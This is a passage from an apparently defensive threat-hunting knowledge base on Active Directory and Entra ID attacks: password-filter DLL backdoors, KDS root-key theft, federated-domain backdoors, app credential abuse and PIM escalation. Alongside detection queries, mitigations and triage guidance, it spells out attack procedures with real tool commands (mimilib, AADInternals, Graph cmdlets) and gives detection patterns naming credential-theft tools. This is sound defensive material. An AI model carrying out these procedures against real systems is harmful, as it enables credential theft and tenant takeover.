4769 from another host: this chain (root-key theft → offline derivation → credential abuse) is malicious. A one-off 4662 against msKds-RootKeyData on a DC by an account/time unrelated to maintenance is also strongly black. White (benign): replication between DC machine accounts ($-ending), a planned admin Get-KdsRootKey lookup under a change ticket, and 4624 Type 3 / 4769 for a gMSA/dMSA from its registered consuming hosts (matching SPN/delegation). Adjudicate by whether the replication/root-key-read principal is a legitimate DC, whether the tool host is an admin workstation, and whether the $-account usage originates from an approved host.","hunt":[{"plat":"MDE","t":"Execution of GoldenDMSA/DSInternals offline-derivation tooling","q":"DeviceProcessEvents\n| where Timestamp > ago(30d)\n| where ProcessCommandLine has_any (\"GoldenDMSA\",\"GoldenGMSA\",\"msKds-RootKeyData\",\"ConvertFrom-ADManagedPasswordBlob\",\"Get-ADKDSRootKey\",\"Get-KdsRootKey\",\"ManagedPasswordId\")\n    or FileName in~ (\"GoldenDMSA.exe\",\"GoldenGMSA.exe\")\n| project Timestamp, DeviceName, AccountName, FileName, ProcessCommandLine, InitiatingProcessFileName\n| sort by Timestamp desc"},{"plat":"MDI","t":"Anomalous LDAP enumeration of KDS root key / dMSA objects","q":"IdentityQueryEvents\n| where Timestamp > ago(30d)\n| where Protocol == \"Ldap\"\n| where Query has_any (\"msKds-RootKeyData\",\"ManagedPasswordId\",\"msDS-DelegatedManagedServiceAccount\",\"Master Root Keys\",\"Group Key Distribution Service\",\"msDS-ManagedPassword\")\n| summarize QueryCount=count(), Targets=make_set(QueryTarget,20) by AccountName, DeviceName, IPAddress, bin(Timestamp,1h)\n| sort by QueryCount desc"},{"plat":"MDI","t":"Directory replication by a non-DC principal (KDS root key theft)","q":"IdentityDirectoryEvents\n| where Timestamp > ago(30d)\n| where ActionType == \"Directory Services replication\"\n| where AccountName !endswith \"$\"   // exclude legitimate DC machine accounts\n| summarize repl=count(), src=make_set(IPAddress,10) by AccountName, DeviceName, bin(Timestamp,1h)\n| sort by repl desc"}],"huntcs":[{"plat":"Event Search","t":"Offline-derivation tooling on the attacker host","q":"event_simpleName=ProcessRollup2 (CommandLine=*GoldenDMSA* OR CommandLine=*GoldenGMSA* OR CommandLine=*msKds-RootKeyData* OR CommandLine=*ConvertFrom-ADManagedPasswordBlob* OR CommandLine=*Get-ADKDSRootKey* OR CommandLine=*ManagedPasswordId*)\n| stats count values(CommandLine) as cmds by aid, ComputerName, UserName, FileName, ParentBaseFileName"},{"plat":"Identity Protection","t":"KDS root key read/replication is a DC-side LDAP/DRSR signal","q":"// Falcon Identity Protection: alert on LDAP reads of CN=Master Root Keys (msKds-RootKeyData) and on Directory Replication (DCSync) initiated by non-DC principals. KDS root key theft is a DC-side DRSR/LDAP event that endpoint ProcessRollup2/Network telemetry does not capture; pivot to the offending host's ProcessRollup2 (GoldenDMSA/DSInternals) once Identity Protection flags the principal."}]},{"name":"Malicious Password Filter DLL (LSA Notification Package)","aka":"Password Filter DLL, Notification Packages, PasswordChangeNotify, mimilib","phase":"dominance","group":"支配・永続化","mitre":"T1556.002","cve":"","sev":"High","summary":"A persistent backdoor abusing password-filter DLLs (LSA Notification Packages): whenever a password is set or changed, LSASS hands the plaintext to the filter's PasswordChangeNotify export, letting a malicious DLL harvest and log it — on a DC this continuously captures domain-wide cleartext credentials.","how":"Prerequisite is local Administrator/SYSTEM on a DC (or any host running SAM). The attacker drops a malicious DLL (e.g. mimikatz mimilib.dll, exporting InitializeChangeNotify/PasswordFilter/PasswordChangeNotify) into %windir%\\System32 and appends the DLL base name (no extension) to the REG_MULTI_SZ value HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\Notification Packages via reg add or PowerShell. LSASS reads notification packages only at startup, so a reboot (or lsass restart) is required to activate it. From then on, every password set/change causes LSASS to call each filter's PasswordChangeNotify with the username and the plaintext new password; the malicious DLL writes it to a file (mimilib defaults to kiwifilter.log) or to C2. The core primitive is hijacking a legitimate in-LSASS extension point that receives cleartext — placed on a DC it continuously harvests plaintext for every account (including krbtgt). Yielding plaintext rather than hashes is what makes it powerful.","tools":"mimikatz (mimilib.dll), custom password-filter DLLs, reg add / PowerShell (edit Notification Packages), Install-PasswordFilter-style PoCs","detect":"Monitor appends to the value HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\Notification Packages (4657, requires SACL auditing), unknown DLLs written to System32, unsigned/unknown DLLs loaded into lsass.exe (Sysmon EID7 / DeviceImageLoadEvents), and SAM loading an unexpected notification package after reboot (4614). Telemetry: DC Security/Sysmon logs, MDE Registry/File/ImageLoad tables, and registry-baseline diffs. The plaintext capture itself happens inside LSASS and is invisible to EDR, so detection relies on correlating the registry edit, DLL drop, and image-load.","events":"4657(Notification Packages値変更/要SACL), 4614(SAMが通知パッケージをロード), Sysmon 7(lsassへの未知DLLロード), Sysmon 13(レジストリ値設定)","mitigate":"Enable LSA Protection (RunAsPPL) so only Microsoft-signed DLLs load into LSASS, blocking unsigned password filters. Apply SACL auditing to the Notification Packages value, baseline it, and alert on any change. Use WDAC/application control on DCs and System32 to prevent unauthorized DLL placement. Enforce Tier 0 protection to minimize DC admin access, and deploy legitimate password-complexity products (e.g. Azure AD Password Protection DC Agent) only under change control with an allowlist. Watch for unplanned DC reboots.","triage":"On a single DC, malicious (black) if the chain lines up: the registry log (MDE DeviceRegistryEvents / 4657) shows an unknown DLL name appended to Notification Packages, the same DC's DeviceFileEvents shows an unsigned DLL written to System32, post-reboot 4614 loads an unexpected notification-package name, and Sysmon 7 shows an unknown/unsigned DLL loaded into lsass.exe. High confidence when the value is changed by a non-installer process (reg.exe/powershell) or when a mimilib-style log file (kiwifilter.log) appears. Benign (white) when a signed MSI installer for Azure AD Password Protection DC Agent or a third-party password-policy product (Specops/nFront/Anixis, etc.) drops a signed DLL and updates Notification Packages within a change window, with 4614 loading a signed package. The default scecli entry being present in the value is normal.","hunt":[{"plat":"MDE","t":"Notification Packages set to anything beyond known-good = black (password-filter registration) / known packages only = white","q":"DeviceRegistryEvents\n| where Timestamp > ago(30d)\n| where RegistryKey has @\"Control\\Lsa\"\n| where RegistryValueName =~ \"Notification Packages\"\n| where ActionType == \"RegistryValueSet\"\n// strip known-good package names; anything left is suspect\n| extend Leftover = replace_regex(tolower(RegistryValueData), @\"scecli|rassfm|azureadpasswordprotection\", \"\")\n| where isnotempty(trim(@\"\\s\", Leftover))\n| where InitiatingProcessFileName !in~ (\"msiexec.exe\",\"TrustedInstaller.exe\")\n| project Timestamp, DeviceName, RegistryValueData, InitiatingProcessFileName, InitiatingProcessCommandLine\n| order by Timestamp desc"},{"plat":"MDE","t":"Rare DLL loaded into lsass.exe fleet-wide = black (malicious filter) / standard package DLLs = white","q":"DeviceImageLoadEvents\n| where Timestamp > ago(30d)\n| where InitiatingProcessFileName =~ \"lsass.exe\"\n| where FileName endswith \".dll\"\n| where FileName !in~ (\"scecli.dll\",\"rassfm.dll\",\"kdcsvc.dll\",\"winbio.dll\",\"azureadpasswordprotection.dll\")\n| summarize Fleet=dcount(DeviceName), Devices=make_set(DeviceName,5), Paths=make_set(FolderPath,3) by FileName, SHA256\n| where Fleet <= 3   // rare across estate = anomaly\n| order by Fleet asc"},{"plat":"Sentinel","t":"DC Lsa registry-value change (4657) from a non-installer = black (Notification Packages tamper) / MSI-driven = white","q":"SecurityEvent\n| where TimeGenerated > ago(30d)\n| where EventID == 4657\n| where ObjectName has @\"Control\\Lsa\"\n| where ProcessName has_any (\"reg.exe\",\"powershell.exe\",\"cmd.exe\",\"rundll32.exe\")\n| project TimeGenerated, Computer, SubjectUserName, ObjectName, ProcessName\n| order by TimeGenerated desc"}],"huntcs":[{"plat":"Event Search","t":"ASEP write to Lsa\\Notification Packages = black (password-filter registration) / none = white","q":"(event_simpleName=AsepValueUpdate OR event_simpleName=RegSystemConfigValueUpdate) RegValueName=\"Notification Packages\"\n| search RegObjectName=\"*\\\\Control\\\\Lsa*\"\n| stats count by ComputerName, RegObjectName, RegValueName, RegStringValue"},{"plat":"Identity Protection","t":"Plaintext capture happens inside LSASS and is invisible to EDR — downstream abuse of the harvested credentials (anomalous logons/lateral movement) surfaces via Identity Protection","q":"// Falcon Identity Protection: correlate the endpoint ASEP write above with subsequent anomalous authentications for accounts whose passwords were changed on the affected DC. The PasswordChangeNotify plaintext handoff itself is not collected by Falcon EDR."}]},{"name":"Entra App / Service Principal Credential Addition","aka":"T1098.001, addPassword, addKey, application owner, AzureHound, ROADtools","phase":"trust","group":"クラウド/ハイブリッド (Entra)","mitre":"T1098.001","cve":"","sev":"High","summary":"An attacker adds a new client secret (addPassword) or certificate key (addKey) to an existing Entra app registration or service principal, gaining a non-interactive, MFA-bypassing, password-reset-resistant backdoor that inherits every API permission and role that app holds.","how":"Prerequisites: being an owner of the target app/SP, or holding a directory role such as Application Administrator, Cloud Application Administrator, or Global Administrator, or any role granting microsoft.directory/applications/credentials/update. The attacker first enumerates with AzureHound or ROADtools (roadrecon) to find apps with dangerous permissions or apps they own. They then call Microsoft Graph POST /applications/{id}/addPassword or addKey (certificate) — via Graph PowerShell (Add-MgApplicationPassword / Add-MgServicePrincipalKey) or Azure CLI (az ad app credential reset). The key primitive: authenticate with the new credential via a client_credentials grant against login.microsoftonline.com /oauth2/v2.0/token, obtaining an access token carrying the app's application permissions (e.g. Mail.Read, RoleManagement.ReadWrite.Directory, Application.ReadWrite.All). Because no user context is used, it bypasses MFA and device-based Conditional Access and persists until the secret expires (up to 2 years).","tools":"AzureHound, ROADtools (roadrecon), Microsoft Graph PowerShell (Add-MgApplicationPassword / Add-MgServicePrincipalKey), Azure CLI (az ad app credential reset), MSGraph API (addPassword / addKey), TokenTactics","detect":"The primary signal is the Entra directory-audit operations \"Add service principal credentials\" and \"Update application – Certificates and secrets management,\" which reach Microsoft Sentinel AuditLogs and (via Defender for Cloud Apps) CloudAppEvents. Correlate with the secondary signal: an immediately following client_credentials sign-in for that app/SP (a service-principal sign-in, non-interactive, from a new IP). On the endpoint, watch for AzureHound.exe / roadrecon / az / Graph PowerShell execution (DeviceProcessEvents) and traffic to graph.microsoft.com and login.microsoftonline.com (DeviceNetworkEvents). Anomaly logic: credential add by a user who does not normally manage app credentials, from a new/foreign IP, off-hours, against a high-privilege app, or immediately after enumeration (AzureHound). Note the cloud operation itself emits no Windows Security event; 4688/4624 are only observable on the operator host.","events":"Entra Audit: Add service principal credentials, Update application – Certificates and secrets management; (操作端末のみ) 4688(azurehound/pwsh/az 実行), 4624(Type3 ネットワークログオン=操作端末へのリモート接続元。クラウド資格情報追加自体はWindowsイベントを発火しない)","mitigate":"(1) Minimize Application/Cloud Application Administrator and Global Administrator assignments; make them time-bound via PIM. (2) Periodically review and prune app owners to remove unneeded ownership. (3) Prefer certificates over secrets, or eliminate secrets entirely by moving to Managed Identity / Workload Identity Federation (OIDC). (4) Gate credential additions behind approval workflows (Entitlement Management / PIM approval). (5) Use Conditional Access for workload identities to restrict SP sign-ins to known IPs. (6) Forward audit logs to a SIEM and alert with high priority on \"Add service principal credentials\"; also detect AzureHound enumeration (bulk Graph directory reads). (7) Inventory and reduce over-privileged application permissions (RoleManagement.ReadWrite.Directory, Application.ReadWrite.All, tenant-wide Mail.Read).","triage":"Black (malicious): an Entra AuditLogs \"Add service principal credentials\" performed by an actor (InitiatedBy.user) who does not normally manage app credentials, from a new/foreign IP, off-hours, against a high-privilege app (e.g. holding Application.ReadWrite.All), immediately followed by a non-interactive client_credentials sign-in for that app from the attacker IP. Confirmed when the operator host's DeviceProcessEvents shows azurehound.exe or \"az ad app credential reset\" / \"Add-MgApplicationPassword\" preceding it, and 4624 (Type 3 network logon) on that host ties back the attacker session. White (benign): the same \"Add service principal credentials\" done by a known CI/CD service account or the responsible admin, from a corporate IP, during business hours, tied to a change ticket, as routine secret rotation (secrets expire every few months, so periodic adds are normal). Terraform / Azure DevOps pipelines running az ad app credential reset legitimately fire the same operation. Decision axes: actor normality, source IP, time-of-day, scope of target app permissions, and presence of prior enumeration.","hunt":[{"plat":"Sentinel","t":"Entra audit: anomalous actor / burst of credential adds","q":"AuditLogs\n| where OperationName in (\"Add service principal credentials\",\"Update application – Certificates and secrets management\",\"Update application\")\n| where Result == \"success\"\n| extend Actor = tostring(InitiatedBy.user.userPrincipalName), ActorIp = tostring(InitiatedBy.user.ipAddress)\n| extend TargetApp = tostring(TargetResources[0].displayName)\n| summarize creds=count(), apps=make_set(TargetApp,20), ips=make_set(ActorIp,10), ops=make_set(OperationName,5) by Actor, bin(TimeGenerated,1h)\n| where creds >= 2 or array_length(ips) > 1\n| sort by creds desc"},{"plat":"MDE","t":"CloudAppEvents: SP credential add via MDCA","q":"CloudAppEvents\n| where ActionType in (\"Add service principal credentials\",\"Update application – Certificates and secrets management\")\n| extend target = tostring(RawEventData.Target), modProp = tostring(RawEventData.ModifiedProperties)\n| summarize adds=count(), apps=make_set(ObjectName,20), ips=make_set(IPAddress,10) by AccountDisplayName, AccountObjectId, bin(Timestamp,1h)\n| where adds >= 2 or array_length(apps) > 1 or array_length(ips) > 1\n| sort by adds desc"},{"plat":"MDE","t":"Operator host: AzureHound/ROADtools/Graph credential-add execution","q":"DeviceProcessEvents\n| where FileName in~ (\"azurehound.exe\",\"az.exe\",\"az.cmd\",\"pwsh.exe\",\"powershell.exe\",\"python.exe\")\n| where ProcessCommandLine has_any (\"az ad app credential reset\",\"Add-MgApplicationPassword\",\"Add-MgServicePrincipalKey\",\"Add-MgServicePrincipalPassword\",\"addPassword\",\"addKey\",\"roadrecon\",\"azurehound\")\n| project Timestamp, DeviceName, AccountName, FileName, ProcessCommandLine, InitiatingProcessFileName\n| sort by Timestamp desc"}],"huntcs":[{"plat":"Event Search","t":"AzureHound/az/Graph credential-add tooling on operator host","q":"event_simpleName=ProcessRollup2 (FileName IN (azurehound.exe, az.exe, pwsh.exe, powershell.exe, python.exe))\n| search CommandLine IN (\"*app credential reset*\", \"*Add-MgApplicationPassword*\", \"*Add-MgServicePrincipalKey*\", \"*Add-MgServicePrincipalPassword*\", \"*addPassword*\", \"*addKey*\", \"*roadrecon*\", \"*azurehound*\")\n| stats count values(CommandLine) as cmds by aid, ComputerName, UserName, FileName, ParentBaseFileName"},{"plat":"Identity Protection","t":"Cloud SP credential add not EDR-collected: ID Protection / DNS pivot","q":"// Falcon EDR does NOT collect Entra directory-audit \"Add service principal credentials\" (cloud-only).\n// Use Falcon Identity Protection detection for anomalous Azure AD service-principal credential add / non-interactive client-credentials sign-in.\n// Endpoint fallback below: hunt AzureHound/ROADtools reaching Graph/login endpoints from the operator host.\nevent_simpleName=DnsRequest DomainName IN (graph.microsoft.com, login.microsoftonline.com)\n| search ContextBaseFileName IN (azurehound.exe, python.exe, pwsh.exe, az.exe)\n| stats count by aid, ComputerName, ContextBaseFileName, DomainName"}]},{"name":"Entra Federated Domain Backdoor (ConvertTo-Federated)","aka":"Set-DomainAuthentication, AADInternals, immutableID, SAML, token-signing cert","phase":"trust","group":"クラウド/ハイブリッド (Entra)","mitre":"T1484.002, T1556","cve":"","sev":"Critical","summary":"A backdoor where an attacker with tenant privilege flips a Managed domain to Federated and registers an attacker-controlled IssuerURI and token-signing certificate, allowing forged SAML tokens for any user and impersonation without a password or MFA — a persistent, tenant-wide compromise of the identity trust relationship.","how":"Prerequisite privilege: Entra Global Administrator (or a role that can manage domain federation such as Hybrid Identity Administrator) plus at least one verified domain. Key primitive: convert the target domain from Managed to Federated and point IssuerUri and the token-signing certificate at attacker-controlled values, so Entra trusts SAML tokens the attacker signs. Steps: (1) Run AADInternals `ConvertTo-AADIntBackdoor -DomainName contoso.com` (injects AADInternals' known IdP config/cert and Issuer), or natively `Set-MsolDomainAuthentication -Authentication Federated -IssuerUri http://any.sts/... -SigningCertificate <b64> -PassiveLogOnUri ...` (MSOnline) / `New-MgDomainFederationConfiguration` (Graph). (2) Obtain the victim's immutableID (Base64 of objectGUID / ms-DS-ConsistencyGuid) via `Get-AADIntUsers` or directory read. (3) Forge a SAML token and sign in with `Open-AADIntOffice365Portal -ImmutableID <id> -Issuer <issuer> -UseBuiltInCertificate -ByPassMFA $true`. Persists as long as the federation configuration and certificate remain in place.","tools":"AADInternals (ConvertTo-AADIntBackdoor, Open-AADIntOffice365Portal, Get-AADIntUsers), MSOnline (Set-MsolDomainAuthentication), Microsoft Graph PowerShell (New-MgDomainFederationConfiguration/Update-MgDomainFederationConfiguration), PowerShell","detect":"Primary signal is Entra Audit Logs: OperationName \"Set domain authentication\" and \"Set federation settings on domain\" fire back-to-back by the same actor/domain in a short window, with the domain name in TargetResources. Anomalies: a domain changing Managed→Federated, an unknown IssuerUri (e.g. AADInternals' default http://any.sts/...), or a new federated domain unrelated to any real ADFS. Watch SigninLogs/AADSignInEvents for sign-ins on a previously Managed domain suddenly switching to federated authentication. On the attacker host, PowerShell script-block logging (4104) shows AADInternals cmdlets and traffic to provisioningapi/adminwebservice.microsoftonline.com and graph.windows.net. Telemetry sources: Entra Audit Logs, SigninLogs/AADSignInEventsBeta, Defender for Cloud Apps (CloudAppEvents), endpoint PowerShell logs/EDR.","events":"Entra Audit: Set domain authentication / Set federation settings on domain (DomainManagement, 同一アクター/ドメインで連続); 4104(AADInternalsスクリプトブロック), 4103(モジュールログ), 4688(powershell.exe)","mitigate":"(1) Minimize roles that can manage domain federation (Global Admin, Hybrid Identity Admin), gate elevation with PIM/JIT, and require phishing-resistant MFA. (2) Alert immediately on `Set domain authentication` / `Set federation settings on domain` audit events to catch unauthorized federated-domain additions. (3) To defeat MFA bypass by forged SAML, set `federatedIdpMfaBehavior` to `rejectMfaByFederatedIdp` on federated domains so Entra enforces its own MFA. (4) Inventory every federated domain's IssuerUri, token-signing certificate and PassiveLogOnUri and remove any unknown values. (5) Restrict and monitor legacy MSOnline/Azure AD Graph module use, and protect admin operations with Conditional Access.","triage":"Black (malicious): in Entra Audit a single actor runs \"Set domain authentication\" and \"Set federation settings on domain\" against the same domain in a short window, the target domain flips Managed→Federated, the IssuerUri is an unknown value (e.g. http://any.sts/...), and it maps to no real ADFS infrastructure or change ticket. Combined with 4104 on the attacker host showing ConvertTo-AADIntBackdoor / Set-MsolDomainAuthentication, followed by that domain's users doing a successful federated sign-in from a new IP (SigninLogs) = black. White (benign): the same events during a legitimate ADFS/third-party IdP onboarding — a known corporate IssuerUri, a CA-issued signing certificate, executed by a Hybrid Identity Admin inside an approved change window = white. A routine certificate rotation (Update-MgDomainFederationConfiguration) that keeps the existing Issuer with expected old/new certs is white. Adjudicate by triangulating host (attacker 4104) × cloud (the Entra audit operation pair and Issuer value) × sign-in (federated switch and IP).","hunt":[{"plat":"Sentinel","t":"Correlate federation-config audit changes","q":"AuditLogs\n| where OperationName in (\"Set domain authentication\",\"Set federation settings on domain\")\n| extend actor = tostring(InitiatedBy.user.userPrincipalName)\n| extend domain = tostring(TargetResources[0].displayName)\n| summarize ops=make_set(OperationName), Results=make_set(Result), events=count(), t0=min(TimeGenerated), t1=max(TimeGenerated) by actor, domain, bin(TimeGenerated, 1h)\n| where array_length(ops) >= 2\n| sort by t1 desc"},{"plat":"MDE","t":"AADInternals/federation cmdlet execution","q":"DeviceProcessEvents\n| where ProcessCommandLine has_any (\"ConvertTo-AADIntBackdoor\",\"New-AADIntBackdoor\",\"Set-MsolDomainAuthentication\",\"New-MgDomainFederationConfiguration\",\"Update-MgDomainFederationConfiguration\",\"Set-DomainAuthentication\",\"Open-AADIntOffice365Portal\")\n| project Timestamp, DeviceName, AccountName, InitiatingProcessFileName, FileName, ProcessCommandLine\n| sort by Timestamp desc"},{"plat":"Sentinel","t":"Anomalous sign-in after federation flip","q":"let fedDomains = AuditLogs\n| where OperationName in (\"Set domain authentication\",\"Set federation settings on domain\")\n| extend domain = tostring(TargetResources[0].displayName)\n| distinct domain;\nSigninLogs\n| where ResultType == 0\n| extend domain = tostring(split(UserPrincipalName, \"@\")[1])\n| where domain in (fedDomains)\n| summarize signins=count(), ips=dcount(IPAddress), apps=make_set(AppDisplayName) by UserPrincipalName, bin(TimeGenerated, 1h)\n| where ips >= 2\n| sort by signins desc"}],"huntcs":[{"plat":"Event Search","t":"AADInternals/federation cmdlets on attacker host","q":"event_simpleName=ProcessRollup2 (CommandLine=*ConvertTo-AADIntBackdoor* OR CommandLine=*Set-MsolDomainAuthentication* OR CommandLine=*New-MgDomainFederationConfiguration* OR CommandLine=*Open-AADIntOffice365Portal* OR CommandLine=*AADInt*)\n| stats count earliest(_time) as first latest(_time) as last by aid, ComputerName, UserName, FileName, CommandLine\n| sort - count"},{"plat":"Identity Protection","t":"Cloud-side federation change (not in EDR) + DNS pivot","q":"// フェデレーションのバックドア化はEntraコントロールプレーンの変更でFalcon EDRは直接収集しない。Falcon Identity Protection の Entra/ハイブリッド監視と Entra 監査 (Set domain authentication) を主ソースとする。\n// 端末ピボット: AADInternals実行ホストからのAzure ADプロビジョニング系エンドポイント解決を検出\nevent_simpleName=DnsRequest (DomainName=*provisioningapi.microsoftonline.com* OR DomainName=*adminwebservice.microsoftonline.com* OR DomainName=*graph.windows.net*)\n| search ContextBaseFileName=powershell.exe OR ContextBaseFileName=pwsh.exe\n| stats count by aid, ComputerName, ContextBaseFileName, DomainName"}]},{"name":"Entra Privileged Role / PIM Escalation","aka":"RoleManagement.ReadWrite.Directory, PIM eligible activation, Global Admin self-grant","phase":"trust","group":"クラウド/ハイブリッド (Entra)","mitre":"T1098.003, T1548.005","cve":"","sev":"High","summary":"A privilege-escalation and persistence technique in Entra ID where a compromised mid-privilege account or service principal self-activates an eligible PIM role or directly assigns itself a privileged directory role (e.g. Global Administrator) to seize control of the whole tenant.","how":"Prerequisite: an app/SP holding RoleManagement.ReadWrite.Directory, an eligible PIM assignment to Privileged Role Administrator/Global Administrator, or a token for a mid-privilege account that can write role assignments. Steps: (1) sign in with stolen creds/refresh token/device code via Connect-MgGraph or az login. (2) If an eligible PIM role exists, JIT-activate Global Admin with New-MgRoleManagementDirectoryRoleAssignmentScheduleRequest -Action selfActivate (instant if approval/MFA not enforced). (3) If assignment rights exist, permanently assign self to a privileged role via New-MgRoleManagementDirectoryRoleAssignment (-Action adminAssign). (4) For persistence, weaken PIM policy (Update-MgPolicyRoleManagementPolicyRule) to drop approval/MFA, or backdoor a new/existing SP by adding credentials (password/cert) or app-role grants (Add-MgServicePrincipalAppRoleAssignment). Key primitive is the Microsoft Graph roleManagement / roleAssignmentScheduleRequests API. Note az role assignment create targets Azure RBAC (subscription scope); directly granting an Entra directory role uses Graph roleManagement, not Azure RBAC.","tools":"Microsoft Graph PowerShell SDK (New-MgRoleManagementDirectoryRoleAssignment*, Update-MgPolicyRoleManagementPolicyRule), Azure CLI (az role assignment create — Azure RBAC), AzureAD/AzureADPreview, ROADtools (roadrecon), GraphRunner, TokenTactics, MicroBurst, PowerZure","detect":"Primary telemetry is the Entra ID directory audit log (AuditLogs) and PIM audit. Watch additions to privileged roles (\\\"Add member to role\\\" / \\\"Add member to role completed (PIM activation)\\\" / \\\"Add eligible member to role\\\"), PIM policy tampering (\\\"Update role setting in PIM\\\"), and SP credential adds (\\\"Add service principal credentials\\\"). The correlation key is the preceding sign-in (SigninLogs/AADSignInEventsBeta): risk level, ClientApp (Graph PowerShell / device code), unmanaged-device IP, and unsatisfied Conditional Access. Defender XDR CloudAppEvents (ActionType \\\"Add member to role.\\\") carries the same signal. Flag self-activation without approval and out-of-hours privileged grants as anomalies. Endpoint EDR (MDE device tables / CrowdStrike) does not observe the directory change itself, so attacker-host Graph/az command execution is the only host-side lead.","events":"Entra監査(AuditLogs OperationName): Add member to role(特権ロール付与), Add member to role completed (PIM activation)(PIM昇格), Add eligible member to role(適格割当付与), Update role setting in PIM(PIMポリシー改ざん), Add service principal credentials(SP資格情報追加=永続化); SigninLogs/AADSignInEventsBeta(特権操作直前のサインイン相関)。※これらはクラウド監査イベントであり Windows Security の数値EventIDは発生しない。","mitigate":"Require approval + MFA + time-bound activation for all privileged roles in PIM and eliminate permanent Global Admin assignments. Enforce Conditional Access (phishing-resistant MFA, compliant device) on assigning Global Admin/Privileged Role Administrator and on PIM policy changes. Inventory and reduce high-privilege app permissions such as RoleManagement.ReadWrite.Directory, and gate SP credential additions behind admin approval and alerting. Isolate/monitor break-glass accounts and raise real-time alerts on any privileged role change.","triage":"Black: in Entra AuditLogs, right after a high-risk / non-compliant-IP sign-in whose ClientApp is Graph PowerShell or device code (SigninLogs/AADSignInEventsBeta), the same actor within minutes JIT-activates Global Administrator without approval (\\\"Add member to role completed (PIM activation)\\\"), then permanently assigns self via \\\"Add member to role\\\", weakens MFA/approval with \\\"Update role setting in PIM\\\", and adds credentials to a new SP via \\\"Add service principal credentials\\\" — that chain is malicious. White: the same \\\"Add member to role completed (PIM activation)\\\" is legitimate when it has a successful approval flow + MFA + satisfied Conditional Access, from a known managed/corporate IP, during business hours, auto-expiring after hours, and an \\\"Add eligible member to role\\\" that matches a helpdesk new-admin onboarding change ticket. Decide on the combination of the preceding sign-in's risk/ClientApp/IP, presence of approval/MFA, and whether the assignment is permanent vs time-bound.","hunt":[{"plat":"Sentinel","t":"Privileged role add/PIM activation correlated with approval & IP = black / legit approval+MFA = white","q":"AuditLogs\n| where TimeGenerated > ago(7d)\n| where OperationName in (\"Add member to role\",\"Add member to role completed (PIM activation)\",\"Add eligible member to role\")\n| where Result == \"success\"\n| extend Actor = tostring(InitiatedBy.user.userPrincipalName), ActorApp = tostring(InitiatedBy.app.displayName), SrcIp = tostring(InitiatedBy.user.ipAddress)\n| mv-expand tr = TargetResources\n| mv-expand mp = parse_json(tostring(tr.modifiedProperties))\n| where tostring(mp.displayName) == \"Role.DisplayName\"\n| extend RoleName = tostring(mp.newValue)\n| where RoleName has_any (\"Global Administrator\",\"Privileged Role Administrator\",\"Privileged Authentication Administrator\",\"Application Administrator\",\"Security Administrator\")\n| project TimeGenerated, OperationName, RoleName, Actor, ActorApp, SrcIp\n| order by TimeGenerated asc"},{"plat":"Sentinel","t":"PIM policy tampering removing approval/MFA = black / change-approved policy edit = white","q":"AuditLogs\n| where TimeGenerated > ago(30d)\n| where OperationName has \"Update role setting in PIM\"\n| where Result == \"success\"\n| extend Actor = tostring(InitiatedBy.user.userPrincipalName), SrcIp = tostring(InitiatedBy.user.ipAddress)\n| mv-expand tr = TargetResources\n| extend RoleTarget = tostring(tr.displayName)\n| project TimeGenerated, OperationName, RoleTarget, Actor, SrcIp\n| order by TimeGenerated desc"},{"plat":"MDE","t":"Bundle SP credential add / role grant by actor+IP to catch the chain = black / planned CI/CD key rotation = white","q":"CloudAppEvents\n| where Timestamp > ago(7d)\n| where ActionType in (\"Add member to role.\",\"Add service principal credentials.\")\n| extend Actor = AccountDisplayName, Target = ObjectName\n| summarize Ops=make_set(ActionType), Count=count(), Targets=make_set(Target) by AccountObjectId, Actor, IPAddress, bin(Timestamp, 1h)\n| where array_length(Ops) >= 2 or Count >= 3\n| order by Count desc"}],"huntcs":[{"plat":"Event Search","t":"Graph/az role-write cmdlets on attacker host = black / legit RSAT reads = white","q":"event_simpleName IN (ProcessRollup2,SyntheticProcessRollup2) (CommandLine=\"*RoleManagementDirectoryRoleAssignment*\" OR CommandLine=\"*RoleAssignmentScheduleRequest*\" OR CommandLine=\"*selfActivate*\" OR CommandLine=\"*az role assignment create*\" OR CommandLine=\"*Add-MgServicePrincipalAppRoleAssignment*\" OR CommandLine=\"*Update-MgPolicyRoleManagementPolicy*\")\n| stats count by aid, ComputerName, UserName, FileName, ParentBaseFileName, CommandLine\n| sort - count"},{"plat":"Identity Protection","t":"Entra role changes are not on EDR; detect via Falcon Identity Protection, then pivot to the source host","q":"// Falcon EDR does not observe Entra ID directory role changes / PIM activations.\n// Use Falcon Identity Protection detections: anomalous privilege escalation / privileged role assignment in Entra ID\n// (Global Administrator, Privileged Role Administrator additions and PIM self-activations from unmanaged or risky sessions).\n// Then pivot to the initiating endpoint by UserName / RemoteAddressIP4 and correlate with ProcessRollup2 (Connect-MgGraph, az login)."}]},{"name":"Entra Authentication Method / MFA Manipulation","aka":"T1098.005, register FIDO/phone, Temporary Access Pass (TAP)","phase":"trust","group":"クラウド/ハイブリッド (Entra)","mitre":"T1098.005, T1556.006","cve":"","sev":"High","summary":"Adversaries add or alter Entra ID authentication methods (FIDO2 keys, phone/Microsoft Authenticator, Temporary Access Pass) on a victim account to bypass MFA and establish password-independent, durable account control.","how":"Prerequisites: registering methods on another user requires Authentication Administrator, Privileged Authentication Administrator, or Global Administrator; issuing a TAP additionally requires an Authentication Policy Administrator to have enabled the TAP policy. For the attacker's own compromised account, a stolen session/primary refresh token alone is enough to enroll a new method (abusing weak MFA-registration posture). Procedure: (1) obtain a victim/admin token (TokenTactics, AADInternals, device-code phishing). (2) Call Microsoft Graph directly — POST /users/{id}/authentication/temporaryAccessPassMethods to mint a TAP, or POST /fido2Methods, /phoneMethods, /microsoftAuthenticatorMethods to plant a backdoor method. (3) Tooling: Microsoft Graph PowerShell New-MgUserAuthenticationTemporaryAccessPassMethod, AADInternals New-AADIntTAP / Set-AADIntUserMFA, GraphRunner. Key primitive: a TAP is a time-limited passcode that satisfies MFA on its own, allowing sign-in without knowing the password, while an added FIDO2/phone method is a durable MFA backdoor. Most execution runs from the attacker host's PowerShell/CLI against the Graph API and leaves no on-prem domain artifacts.","tools":"Microsoft Graph PowerShell (Microsoft.Graph.Identity.Signins), AADInternals, TokenTactics, GraphRunner, ROADtools, Azure CLI, Entra admin portal, Microsoft Graph API","detect":"The primary detection surface is the Entra audit log (cloud). Signals: \"Admin registered security info\" / \"Admin created Temporary Access Pass\" where the initiator (InitiatedBy) differs from the target (TargetResources), registration from unfamiliar IP/ASN/geo, a successful sign-in from the same or a different IP immediately after a TAP is created, and bulk TAP issuance to many targets in a short window. Telemetry: AuditLogs 